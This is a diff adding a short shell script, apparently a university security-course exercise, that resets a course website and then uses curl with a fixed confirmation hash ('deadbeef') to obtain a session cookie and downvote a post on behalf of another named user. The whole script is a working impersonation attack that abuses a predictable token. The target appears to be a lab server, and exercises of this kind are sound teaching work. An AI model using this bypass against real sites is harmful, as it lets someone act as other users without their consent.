@@ -1,0 +1,6 @@
+echo "******************************************************************"
+echo "this script will first reset the website, and then make downvote on the first post on behalf of the user mmazmudar on the first post"
+echo "******************************************************************"
+curl "http://ugster20.student.cs.uwaterloo.ca/reset/r82zhang"
+curl -c mycookie "http://$1/confirm.php?hash=deadbeef"
+curl -b ./mycookie "http://$1/vote.php?id=1&vote=-1"
